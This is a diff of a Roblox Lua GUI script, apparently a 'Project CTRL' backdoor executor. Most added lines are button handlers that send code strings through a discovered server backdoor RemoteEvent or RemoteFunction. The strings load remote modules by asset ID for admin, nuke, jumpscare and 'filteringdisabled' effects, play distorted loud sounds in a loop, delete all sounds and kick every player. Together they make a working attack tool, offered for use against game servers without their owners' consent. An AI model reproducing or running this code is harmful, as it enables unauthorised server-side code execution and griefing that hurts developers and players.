-G2L["bd"] = Instance.new("ImageButton", G2L["3"]);
--- [ERROR] cannot convert HoverImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["bd"]["BorderSizePixel"] = 0;
-G2L["bd"]["BackgroundTransparency"] = 1;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["bd"]["Image"] = [[rbxassetid://484211948]];
-G2L["bd"]["Size"] = UDim2.new(0, 43, 0, 43);
-G2L["bd"]["HoverImage"] = [[rbxassetid://%lld]];
-G2L["bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["bd"]["Position"] = UDim2.new(0, 0, 0.7027, 0);
-
-
--- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["be"] = Instance.new("UIStroke", G2L["bd"]);
-
-
-
--- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["bf"] = Instance.new("UIStroke", G2L["bd"]);
-G2L["bf"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["c0"] = Instance.new("LocalScript", G2L["bd"]);
+-- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
+G2L["bd"] = Instance.new("UIStroke", G2L["bc"]);
 
 
 
--- StarterGui.ScreenGui.LocalScript
-G2L["c1"] = Instance.new("LocalScript", G2L["1"]);
+-- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
+G2L["be"] = Instance.new("UIStroke", G2L["bc"]);
+G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["be"]["Thickness"] = 2;
 
+
+-- StarterGui.ScreenGui.Frame.page2.RE
+G2L["bf"] = Instance.new("TextButton", G2L["a9"]);
+G2L["bf"]["TextWrapped"] = true;
+G2L["bf"]["BorderSizePixel"] = 0;
+G2L["bf"]["TextSize"] = 14;
+G2L["bf"]["TextScaled"] = true;
+G2L["bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bf"]["BackgroundTransparency"] = 1;
+G2L["bf"]["Size"] = UDim2.new(0, 58, 0, 41);
+G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bf"]["Text"] = [[SPAWN]];
+G2L["bf"]["Name"] = [[RE]];
+G2L["bf"]["Position"] = UDim2.new(0.71468, 0, 0.83846, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
+G2L["c0"] = Instance.new("UIStroke", G2L["bf"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
+G2L["c1"] = Instance.new("UIStroke", G2L["bf"]);
+G2L["c1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["c1"]["Thickness"] = 2;
+
+
+-- StarterGui.ScreenGui.Frame.page2.R6
+G2L["c2"] = Instance.new("TextButton", G2L["a9"]);
+G2L["c2"]["TextWrapped"] = true;
+G2L["c2"]["BorderSizePixel"] = 0;
+G2L["c2"]["TextSize"] = 14;
+G2L["c2"]["TextScaled"] = true;
+G2L["c2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c2"]["BackgroundTransparency"] = 1;
+G2L["c2"]["Size"] = UDim2.new(0, 44, 0, 41);
+G2L["c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c2"]["Text"] = [[R6]];
+G2L["c2"]["Name"] = [[R6]];
+G2L["c2"]["Position"] = UDim2.new(0.87535, 0, 0.83846, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
+G2L["c3"] = Instance.new("UIStroke", G2L["c2"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
+G2L["c4"] = Instance.new("UIStroke", G2L["c2"]);
+G2L["c4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["c4"]["Thickness"] = 2;
 
 
 -- StarterGui.ScreenGui.Scanner
@@ -1719,13 +1743,13 @@ local script = G2L["4"];
 end;
 task.spawn(C_4);
 -- StarterGui.ScreenGui.Frame.TextLabel.ImageButton.LocalScript
-local function C_c()
-local script = G2L["c"];
+local function C_b()
+local script = G2L["b"];
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Parent.Parent:Destroy()
 	end)
 end;
-task.spawn(C_c);
+task.spawn(C_b);
 -- StarterGui.ScreenGui.Frame.page1.ImageLabel.LocalScript
 local function C_f()
 local script = G2L["f"];
@@ -1760,9 +1784,1053 @@ local script = G2L["12"];
 	script.Parent.Text = 'Welcome, ' .. game.Players.LocalPlayer.Name .. '!'
 end;
 task.spawn(C_12);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_23()
+local script = G2L["23"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(14125553864):Fire("' .. username .. '","c00lkidd")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_23);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_27()
+local script = G2L["27"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = ' require(14572394952)("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_27);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_2b()
+local script = G2L["2b"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_2b);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_2f()
+local script = G2L["2f"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(15267263357).V11("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_2f);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_33()
+local script = G2L["33"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(78790302691160):Hload("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_33);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_37()
+local script = G2L["37"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(12350030542).RC7("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_37);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_3b()
+local script = G2L["3b"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(17776365113).kj("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_3b);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_3f()
+local script = G2L["3f"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(135686792632620).nuke("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_3f);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_43()
+local script = G2L["43"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = [[local SoundService = game:GetService("SoundService")
+		
+	-- Sound IDs
+		local soundIds = {
+			82706813987936,
+			76279547029713,
+			135763933956435
+		}
+		
+	-- Create and configure sounds
+		local sounds = {}
+		
+	for _, id in ipairs(soundIds) do
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://" .. id
+		sound.Volume = 10
+		sound.PlaybackSpeed = 0.2
+			
+	-- Add distortion effect (level 0.9)
+		local distortion = Instance.new("DistortionSoundEffect")
+		distortion.Level = 0.5
+		distortion.Parent = sound
+			
+		sound.Parent = SoundService
+		table.insert(sounds, sound)
+	end
+		
+	-- Function to play sounds in sequence
+		local function playSequence()
+			while true do
+				for _, sound in ipairs(sounds) do
+					sound:Play()
+					sound.Ended:Wait()
+				end
+			end
+		end
+		
+	-- Start the loop
+	playSequence()
+	]]
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_43);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_47()
+local script = G2L["47"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(7634392335)("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_47);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_4b()
+local script = G2L["4b"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(75026282232818).load("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_4b);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_4f()
+local script = G2L["4f"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(70681531110549).admin("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_4f);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_53()
+local script = G2L["53"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(10304477576).AntiSkid()'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_53);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_57()
+local script = G2L["57"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = [[for _, obj in ipairs(game:GetDescendants()) do
+		if obj:IsA("Sound") then
+		obj:Destroy()
+		end
+		end
+		]]
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_57);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_5b()
+local script = G2L["5b"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = [[for i,v player in ipairs(game.Players:GetDescendants()) do
+		v:Kick("This server has been shut down")
+		end
+		]]
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_5b);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_5f()
+local script = G2L["5f"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(9978015219).filteringdisabled("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_5f);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_63()
+local script = G2L["63"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = ' require(14499140823)("' .. username .. '", "sorcerer")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_63);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_67()
+local script = G2L["67"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(2823974237).giveGuns' .. username .. ''
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_67);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_6b()
+local script = G2L["6b"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(104732504345735).jumpscare("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_6b);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_6f()
+local script = G2L["6f"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(104712588684071)("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_6f);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_73()
+local script = G2L["73"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(6036737823).CrackedByIncreaseron("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_73);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_77()
+local script = G2L["77"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.page1.Visible = true
+		script.Parent.Parent.page2.Visible = false
+		script.Parent.Parent.page3.Visible = false
+		script.Parent.Parent.page4.Visible = false
+		script.Parent.Parent.page5.Visible = false
+	end)
+end;
+task.spawn(C_77);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_7a()
+local script = G2L["7a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.page1.Visible = false
+		script.Parent.Parent.page2.Visible = true
+		script.Parent.Parent.page3.Visible = false
+		script.Parent.Parent.page4.Visible = false
+		script.Parent.Parent.page5.Visible = false
+	end)
+end;
+task.spawn(C_7a);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+local function C_7d()
+local script = G2L["7d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.page1.Visible = false
+		script.Parent.Parent.page2.Visible = false
+		script.Parent.Parent.page3.Visible = true
+		script.Parent.Parent.page4.Visible = false
+		script.Parent.Parent.page5.Visible = false
+	end)
+end;
+task.spawn(C_7d);
+-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
+local function C_81()
+local script = G2L["81"];
+	local scrollingFrame = script.Parent
+	local LogService = game:GetService("LogService")
+	
+	-- Format time
+	local function getTimeStamp()
+		local t = os.date("*t")
+		return string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
+	end
+	
+	-- Create a new label for each log line
+	local function addLogLine(text, color)
+		local label = Instance.new("TextLabel")
+		label.Name = "LOG"
+		label.Text = text
+		label.TextColor3 = color
+		label.BackgroundTransparency = 1
+		label.Font = Enum.Font.Code
+		label.TextSize = 14
+		label.TextWrapped = true
+		label.Size = UDim2.new(1, -10, 0, 0)
+		label.AutomaticSize = Enum.AutomaticSize.Y
+		label.Parent = scrollingFrame
+		
+		-- Apply default UIStroke
+		local stroke = Instance.new("UIStroke")
+		stroke.Parent = label
+	end
+	
+	-- Listen to all console output
